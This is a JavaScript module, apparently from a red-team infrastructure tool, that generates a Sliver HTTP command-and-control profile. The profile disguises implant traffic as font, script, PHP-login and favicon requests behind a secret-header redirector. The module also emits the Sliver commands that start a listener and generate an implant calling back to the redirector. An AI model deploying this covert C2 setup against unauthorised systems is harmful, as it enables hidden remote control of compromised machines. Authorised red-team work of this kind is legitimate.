import { requireHop1 } from './common.js';

// The emitted listener port must match where the chain actually delivers —
// the tunnel's local service (C2 panel) in tunnel mode, the listener URL in
// direct mode — or a copy-pasted listener never receives the traffic. Falls
// back to 8443 when neither carries an explicit port.
function listenerPort(chain) {
  const raw = ((chain.c2?.mode === 'tunnel' ? chain.c2?.localService : chain.c2?.url) || '').trim();
  const m = /:(\d+)(?:\/|$)/.exec(raw);
  return m ? m[1] : '8443';
}

// Sliver HTTP-C2 profile — standard Sliver http-c2 profile shape
// (implant_config + server_config). The callback host is not part of the
// profile; it goes on the generate command line, which we emit too.
export function build(chain, settings, options = {}) {
  const h = requireHop1(chain, settings, options);
  const content = JSON.stringify(
    {
      implant_config: {
        user_agent: h.userAgent,
        chrome_base_version: 126,
        macos_version: '10_15_7',
        url_parameters: null,
        headers: [{ name: h.secretHeader, value: h.secretValue }],
        max_files: 8,
        min_files: 2,
        max_paths: 8,
        min_paths: 2,
        stager_file_ext: '.woff',
        stager_files: [
          'attribute_text_w01_regular',
          'ZillaSlab-Regular.subset.bbc33fb47cf6',
          'ZillaSlab-Bold.subset.e96c15f68c68',
          'Inter-Regular',
          'Inter-Medium',
        ],
        stager_paths: ['static', 'assets', 'fonts', 'locales'],
        poll_file_ext: '.js',
        poll_files: ['bootstrap', 'bootstrap.min', 'jquery.min', 'jquery', 'route', 'app', 'app.min', 'script'],
        poll_paths: ['js', 'umd', 'assets', 'bundle', 'bundles', 'scripts', 'javascript'],
        start_session_file_ext: '.html',
        session_file_ext: '.php',
        session_files: ['login', 'signin', 'api', 'samples', 'rpc', 'index', 'admin', 'register'],
        session_paths: ['php', 'api', 'upload', 'actions', 'rest', 'v1', 'auth', 'authenticate', 'oauth2'],
        close_file_ext: '.png',
        close_files: ['favicon', 'sample', 'example'],
        close_paths: ['static', 'www', 'assets', 'images', 'icons'],
      },
      server_config: {
        random_version_headers: false,
        headers: [],
        cookies: ['PHPSESSID', 'SID', 'SSID', 'APISID', 'csrf-state', 'AWSALBCORS'],
      },
    },
    null,
    2
  );

  return {
    framework: 'sliver',
    filename: `${chain.name}-sliver-http-c2.json`,
    language: 'json',
    content,
    commands: [
      `# on the sliver server: start the listener on the port the chain delivers to (tunnel local service, or listener URL in direct mode)`,
      `http --lhost 0.0.0.0 --lport ${listenerPort(chain)}`,
      `# generate an implant pointed at hop 1 with this profile:`,
      `generate --http ${h.url} --http-c2-profile ${chain.name}-sliver-http-c2.json --skip-symbols`,
    ],
    notes: [
      'The secret header must be present in the profile or hop 1 will serve the disguise page to the implant.',
      'The listener stays on the C2 box (direct) or behind the tunnel (tunnel mode) — never expose it publicly.',
    ],
  };
}
